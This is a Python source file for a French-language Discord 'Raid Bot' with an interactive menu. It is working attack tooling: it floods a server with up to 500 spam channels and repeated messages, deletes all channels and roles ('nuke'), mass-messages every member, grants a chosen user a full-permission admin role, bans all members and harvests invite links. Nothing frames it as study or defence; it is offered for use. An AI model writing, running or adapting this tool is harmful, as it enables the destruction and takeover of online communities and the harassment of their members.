import discord
import asyncio
import os

intents = discord.Intents.default()
intents.members = True

client = discord.Client(intents=intents)

rate_limit_count = 0

# Define the ASCII art with ANSI color codes for a violet gradient
ASCII_ART = """
\033[38;2;75;0;130m $$$$$$$\   $$$$$$\  $$$$$$\ $$$$$$$\        $$$$$$$\   $$$$$$\ $$$$$$$$\       
\033[38;2;138;43;226m$$  __$$\ $$  __$$\ \_$$  _|$$  __$$\       $$  __$$\ $$  __$$\\__$$  __|      
\033[38;2;153;50;204m$$ |  $$ |$$ /  $$ |  $$ |  $$ |  $$ |      $$ |  $$ |$$ /  $$ |  $$ |         
\033[38;2;186;85;211m$$$$$$$  |$$$$$$$$ |  $$ |  $$ |  $$ |      $$$$$$$\ |$$ |  $$ |  $$ |         
\033[38;2;216;191;216m$$  __$$< $$  __$$ |  $$ |  $$ |  $$ |      $$  __$$\ $$ |  $$ |  $$ |         
\033[38;2;238;130;238m$$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |      $$ |  $$ |$$ |  $$ |  $$ |         
\033[38;2;255;182;193m$$ |  $$ |$$ |  $$ |$$$$$$\ $$$$$$$  |      $$$$$$$  | $$$$$$  |  $$ |         
\033[38;2;255;182;193m\__|  \__|\__|  \__|\______|\_______/       \_______/  \______/   \__|         
\033[0m"""

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def spam_channels(guild, channel_name, message, num_channels, repeat_count):
    global rate_limit_count

    print_violet(f"Création de {num_channels} salons '{channel_name}' dans le serveur {guild.name}")

    tasks = []
    for i in range(num_channels):
        tasks.append(create_and_send_message(guild, channel_name, message, i+1, repeat_count))
    
    try:
        await asyncio.gather(*tasks)
        print_violet(f"{num_channels} salons créés avec succès dans le serveur {guild.name}")
        rate_limit_count = 0
    except discord.HTTPException as e:
        if e.status == 429:
            rate_limit_count += 1
            print_violet(f"Vous êtes rate limited par Discord ({rate_limit_count}/3)")
            if rate_limit_count >= 3:
                print_violet("Vous êtes rate limited par Discord 3 fois consécutives, le raid s'arrête et retourne au menu principal.")
                rate_limit_count = 0
                return False
            else:
                await asyncio.sleep(2)
                return await spam_channels(guild, channel_name, message, num_channels, repeat_count)
    return True

async def create_and_send_message(guild, channel_name, message, index, repeat_count):
    channel = await guild.create_text_channel(f"{channel_name}-{index}")
    print_violet(f"Salon '{channel.name}' créé dans le serveur {guild.name}")

    if message.strip():
        for _ in range(repeat_count):
            await channel.send(message)
            await asyncio.sleep(0.5)
    else:
        print_violet(f"Message vide pour le salon '{channel.name}', aucun message envoyé.")

async def list_servers():
    print_violet("Affichage des serveurs et invitations :")
    for guild in client.guilds:
        if guild.text_channels:
            invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
            print_violet(f"Nom du serveur : {guild.name}")
            print_violet(f"ID du serveur : {guild.id}")
            print_violet(f"Invitation : {invite.url}")
            print_violet("--------------------------")
        else:
            print_violet(f"Le serveur '{guild.name}' n'a pas de salons textuels.")
            print_violet("--------------------------")

async def nuke_server(guild):
    print_violet(f"En train de nettoyer le serveur {guild.name} ...")

    for channel in guild.text_channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print_violet(f"Impossible de supprimer le salon {channel.name} car le bot n'a pas les permissions nécessaires.")
        except Exception as e:
            print_violet(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")

    for role in guild.roles:
        try:
            await role.delete()
        except discord.Forbidden:
            print_violet(f"Impossible de supprimer le rôle {role.name} car le bot n'a pas les permissions nécessaires.")
        except discord.HTTPException as e:
            print_violet(f"Une erreur s'est produite lors de la suppression du rôle {role.name} : {e}")

    print_violet(f"Nettoyage terminé pour le serveur {guild.name}.")

async def dm_all_members(guild, message):
    print_violet(f"Envoi de messages directs à tous les membres du serveur {guild.name}")
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            print_violet(f"Message envoyé à {member.name}")
        except discord.Forbidden:
            print_violet(f"Impossible d'envoyer un message à {member.name}, permission refusée.")
        except Exception as e:
            print_violet(f"Une erreur s'est produite lors de l'envoi d'un message à {member.name} : {e}")

async def give_admin_role(guild, member_id):
    member = guild.get_member(member_id)
    if member is None:
        print_violet(f"Impossible de trouver le membre avec l'ID {member_id} dans le serveur {guild.name}")
        return

    bot_roles = [role for role in guild.roles if role.managed and role in guild.me.roles]
    if not bot_roles:
        print_violet(f"Impossible de trouver le rôle du bot dans le serveur {guild.name}")
        return

    highest_bot_role = max(bot_roles, key=lambda r: r.position)
    
    admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions.all(), reason="Admin role created by bot")
    
    await admin_role.edit(position=highest_bot_role.position - 1)
    
    await member.add_roles(admin_role)
    print_violet(f"Rôle administrateur donné à {member.name} dans le serveur {guild.name}")

async def ban_unban_menu():
    while True:
        clear_console()
        print(ASCII_ART) 
        print_violet("\nMenu Ban | Unban :")
        print_violet("1. Ban all")
        print_violet("2. Ban 1 personne")
        print_violet("3. Unban all")
        print_violet("4. Unban 1 personne")
        print_violet("5. Retourner au menu principal")
        choice = input_violet("Entrez votre choix (1, 2, 3, 4 ou 5) : ")

        if choice == '1':
            guild_id_input = input_violet("Entrez l'ID du serveur où bannir tous les membres : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue
            
            for member in guild.members:
                if member.bot:
                    continue
                try:
                    await member.ban(reason="Ban all by bot")
                    print_violet(f"Membre {member.name} banni")
                except Exception as e:
                    print_violet(f"Erreur lors du bannissement de {member.name} : {e}")
            print_violet("Tous les membres ont été bannis.")
            
        elif choice == '2':
            guild_id_input = input_violet("Entrez l'ID du serveur où bannir le membre : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            member_id_input = input_violet("Entrez l'ID du membre à bannir : ")
            member_id = int(member_id_input) if member_id_input.strip() else None
            
            member = guild.get_member(member_id)
            if member is None:
                print_violet(f"Impossible de trouver le membre avec l'ID {member_id} dans le serveur {guild.name}")
                continue
            
            try:
                await member.ban(reason="Ban 1 personne by bot")
                print_violet(f"Membre {member.name} banni")
            except Exception as e:
                print_violet(f"Erreur lors du bannissement de {member.name} : {e}")
                
        elif choice == '3':
            guild_id_input = input_violet("Entrez l'ID du serveur où débannir tous les membres : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            bans = await guild.bans()
            for ban_entry in bans:
                user = ban_entry.user
                try:
                    await guild.unban(user, reason="Unban all by bot")
                    print_violet(f"Membre {user.name} débanni")
                except Exception as e:
                    print_violet(f"Erreur lors du débannissement de {user.name} : {e}")
            print_violet("Tous les membres ont été débannis.")
            
        elif choice == '4':
            guild_id_input = input_violet("Entrez l'ID du serveur où débannir le membre : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            member_id_input = input_violet("Entrez l'ID du membre à débannir : ")
            member_id = int(member_id_input) if member_id_input.strip() else None
            
            user = await client.fetch_user(member_id)
            if user is None:
                print_violet(f"Impossible de trouver le membre avec l'ID {member_id}")
                continue
            
            try:
                await guild.unban(user, reason="Unban 1 personne by bot")
                print_violet(f"Membre {user.name} débanni")
            except Exception as e:
                print_violet(f"Erreur lors du débannissement de {user.name} : {e}")
                
        elif choice == '5':
            print_violet("Retour au menu principal...")
            return
        else:
            print_violet("Choix invalide. Veuillez entrer 1, 2, 3, 4 ou 5.")

async def main_menu():
    global rate_limit_count
    while True:
        clear_console()
        print(ASCII_ART)
        print_violet("\nBienvenue ! Voici les options disponibles :")
        print_violet("1. Raid Bot")
        print_violet("2. Quitter")
        choice = input_violet("Entrez votre choix (1 ou 2) : ")

        if choice == '1':
            await raid_bot_menu()
        elif choice == '2':
            print_violet("Au revoir!")
            break
        else:
            print_violet("Choix invalide. Veuillez entrer 1 ou 2.")


async def mass_role_menu():
    clear_console()
    print(ASCII_ART)  # Afficher le texte ASCII art ici
    print_violet("\nMenu Masse Rôles :")

    guild_id_input = input_violet("Entrez l'ID du serveur où créer les rôles : ")
    guild_id = int(guild_id_input) if guild_id_input.strip() else None

    guild = client.get_guild(guild_id)
    if guild is None:
        print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
        return

    role_name = input_violet("Entrez le nom du rôle : ")
    number_of_roles_input = input_violet("Combien de rôles souhaitez-vous créer ? : ")
    number_of_roles = int(number_of_roles_input) if number_of_roles_input.strip() else 1

    try:
        for i in range(number_of_roles):
            await guild.create_role(name=f"{role_name}-{i+1}")
            print_violet(f"Rôle '{role_name}-{i+1}' créé avec succès.")
    except discord.Forbidden:
        print_violet("Le bot n'a pas la permission de créer des rôles.")
    except discord.HTTPException as e:
        print_violet(f"Une erreur s'est produite lors de la création des rôles : {e}")

    print_violet("Création des rôles terminée.")
    print_violet("Retour au menu principal...")


async def raid_bot_menu():
    while True:
        clear_console()
        print(ASCII_ART)  # Afficher le texte ASCII art ici
        print_violet("\nRaid Bot Menu :")
        print_violet("1. Raid serveur")
        print_violet("2. Liste des serveurs et invitations")
        print_violet("3. Nuke le serveur (efface tous les salons et rôles)")
        print_violet("4. Mass DM Membres d'un Serveur")
        print_violet("5. Donner le rôle administrateur à un membre")
        print_violet("6. Ban | Unban (all ou 1 personne)")
        print_violet("7. Masse rôle")  # Nouvelle option ajoutée
        print_violet("8. Retourner au menu principal")  # Modifiez les indices en conséquence
        choice = input_violet("Entrez votre choix (1, 2, 3, 4, 5, 6, 7 ou 8) : ")

        if choice == '1':
            guild_id_input = input_violet("Entrez l'ID du serveur où créer les salons : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue
            
            channel_name = input_violet("Entrez le nom du salon à créer : ")
            message = input_violet("Entrez le message à envoyer dans chaque salon : ")
            
            num_channels_input = input_violet("Combien de salons souhaitez-vous créer (Maximum 500) ? : ")
            num_channels = min(int(num_channels_input) if num_channels_input.strip() else 1, 500)
            
            repeat_count_input = input_violet("Combien de fois envoyer le message dans chaque salon ? : ")
            repeat_count = int(repeat_count_input) if repeat_count_input.strip() else 1
            
            change_guild_name = input_violet("Voulez-vous changer le nom du serveur ? (oui/non) : ").strip().lower()
            
            if change_guild_name == "oui":
                new_guild_name = input_violet(f"Entrez le nouveau nom pour le serveur '{guild.name}' : ").strip()
                if new_guild_name:
                    try:
                        await guild.edit(name=new_guild_name)
                        print_violet(f"Nom du serveur changé en '{new_guild_name}'")
                    except discord.Forbidden:
                        print_violet("Le bot n'a pas la permission de changer le nom du serveur.")
                else:
                    print_violet("Nom du serveur non modifié.")
            elif change_guild_name == "non":
                print_violet("Nom du serveur non modifié.")
            else:
                print_violet("Choix invalide. Nom du serveur non modifié.")

            raid_success = await spam_channels(guild, channel_name, message, num_channels, repeat_count)
            if not raid_success:
                print_violet("Retour au menu principal...")
                
        elif choice == '2':
            await list_servers()
            print_violet("Retour au menu principal...")
        elif choice == '3':
            guild_id_input = input_violet("Entrez l'ID du serveur à nuke : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            await nuke_server(guild)
            print_violet("Retour au menu principal...")
        elif choice == '4':
            guild_id_input = input_violet("Entrez l'ID du serveur où envoyer les messages : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            message = input_violet("Entrez le message à envoyer à tous les membres : ")
            await dm_all_members(guild, message)
            print_violet("Retour au menu principal...")
        elif choice == '5':
            guild_id_input = input_violet("Entrez l'ID du serveur où donner le rôle administrateur : ")
            guild_id = int(guild_id_input) if guild_id_input.strip() else None
            
            guild = client.get_guild(guild_id)
            if guild is None:
                print_violet(f"Impossible de trouver le serveur avec l'ID {guild_id}")
                continue

            member_id_input = input_violet("Entrez l'ID du membre à qui donner le rôle administrateur : ")
            member_id = int(member_id_input) if member_id_input.strip() else None
            
            await give_admin_role(guild, member_id)
            print_violet("Retour au menu principal...")
        elif choice == '6':
            await ban_unban_menu()
        elif choice == '7':  # Nouvelle option pour Masse rôle
            await mass_role_menu()
        elif choice == '8':  # Retourner au menu principal
            print_violet("Retour au menu principal...")
            return  # Quitte la boucle et retourne au menu principal
        else:
            print_violet("Choix invalide. Veuillez entrer 1, 2, 3, 4, 5, 6, 7 ou 8.")




@client.event
async def on_ready():
    clear_console()
    print_violet(f"Bot connecté en tant que {client.user}")
    await client.change_presence(activity=discord.Game(name="github.com/kzoxmazpx/RaidBot"))
    await main_menu()

def print_violet(text):
    # Function to print text in a gradient violet color
    gradient_colors = [
        (75, 0, 130),
        (138, 43, 226),
        (153, 50, 204),
        (186, 85, 211),
        (216, 191, 216),
        (238, 130, 238),
        (255, 182, 193),
    ]

    gradient_length = len(gradient_colors)
    for i, line in enumerate(text.split('\n')):
        color = gradient_colors[i % gradient_length]
        print(f"\033[38;2;{color[0]};{color[1]};{color[2]}m{line}\033[0m")

def input_violet(prompt):
    gradient_colors = [
        (75, 0, 130),
        (138, 43, 226),
        (153, 50, 204),
        (186, 85, 211),
        (216, 191, 216),
        (238, 130, 238),
        (255, 182, 193),
    ]

    gradient_length = len(gradient_colors)
    prompt_lines = prompt.split('\n')
    colored_prompt = ""

    for i, line in enumerate(prompt_lines):
        color = gradient_colors[i % gradient_length]
        colored_prompt += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{line}\033[0m\n"

    return input(colored_prompt.rstrip('\n'))

if __name__ == "__main__":
    clear_console()
    token = input_violet("Entrez le token du bot : ")
    clear_console()
    print(ASCII_ART)
    try:
        client.run(token)
    except discord.PrivilegedIntentsRequired:
        print_violet("Erreur: Privileged intents required. Veuillez activer les intents dans le portail développeur.")
    except discord.LoginFailure:
        print_violet("Erreur: Échec de la connexion. Vérifiez le token du bot.")
